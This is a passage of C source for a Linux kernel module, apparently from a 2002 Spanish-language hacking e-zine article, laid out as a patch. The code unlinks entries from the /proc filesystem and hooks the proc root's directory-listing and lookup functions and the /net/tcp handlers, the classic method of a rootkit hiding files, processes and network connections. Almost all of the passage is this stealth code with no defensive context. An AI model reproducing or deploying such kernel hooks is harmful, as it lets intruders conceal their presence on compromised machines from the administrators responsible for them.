+      lst_entry = pr;
+      pr = pr->next;
+      if (pr == NULL)
+	{
+	  kfree (tmp);
+	  return NULL;
+	}
+    }
+
+  kfree (tmp);
+  if (*(path + x) == 0)
+    return pr;
+  else
+    {
+      lst_entry = pr;
+      return traverse_proc (path + x + 1, pr->subdir);
+    }
+}
+
+
+/*
+ * delete_proc_file:
+ * borra un archivo desde el sistema de archivos proc. los inode de los
+ * archivos seguiran pero ya no seran mas accesibles (no apuntado a por ningun
+ * otro proc inode). el puntero de subdir sera copiado al subdir del puntero
+ * del inode precedente. devuelve 1 en exito, 0 en error.
+ */
+int delete_proc_file (char *name)
+{
+  struct proc_dir_entry	*last = NULL;
+  char			*tmp = NULL;
+  int			i = 0;	/* borra subdir? */
+
+  last = traverse_proc (name, NULL);
+
+  if (last == NULL)
+    return 0;
+  if (lst_entry == NULL)
+    return 0;
+
+  if (last->subdir != NULL && i)
+    lst_entry->subdir = last->subdir;
+
+  while (*name != 0)
+    {
+      if (*name == '/')
+        tmp = name + 1;
+      *name++;
+    }
+
+  if (!strcmp (tmp, lst_entry->next->name))
+    lst_entry->next = last->next;
+  else if (!strcmp (tmp, lst_entry->subdir->name))
+    lst_entry->subdir = last->next;
+  else
+    return 0;
+
+  return 1;
+}
+
+
+int init_module ()
+{
+  struct proc_dir_entry	*last = NULL;
+  last = traverse_proc ("~/net/tcp", NULL);
+
+  old_readdir_root = proc_root.FILE_OPS->readdir;
+  old_lookup_root = proc_root.INODE_OPS->lookup;
+  
+  proc_root.FILE_OPS->readdir = &new_readdir_root;
+  proc_root.INODE_OPS->lookup = &new_lookup_root;
+
+  if (last != NULL)
+    {
+#ifdef DEBUG
+      printk ("Installing hooks ....\n");
+#endif
+      old_get_info_tcp = last->get_info;
+      old_write_tcp = last->FILE_OPS->write;
+
+      last->get_info = &new_get_info_tcp;
+      last->FILE_OPS->write = &new_write_tcp;
+    }
+
+  return 0;
+}
+
+
+void cleanup_module ()
+{
+  struct proc_dir_entry	*last = NULL;
+  last = traverse_proc ("~/net/tcp", NULL);
+
+  proc_root.FILE_OPS->readdir = old_readdir_root;
+  proc_root.INODE_OPS->lookup = old_lookup_root;
+
+  if (last != NULL)
+    {
+#ifdef DEBUG
+      printk ("Removing hooks ....\n");
+#endif
+      last->get_info = old_get_info_tcp;
+      last->FILE_OPS->write = old_write_tcp;
+    }
+}
+<-->
+
+
+ Traducido por Active Matrix - ActiveMatrix@technologist.com
+ Para RareGaZz - http://raregazz.cjb.net
+ Argentina, 2002
+ El articulo aqui traducido, mantiene los derechos de autor.
+ 
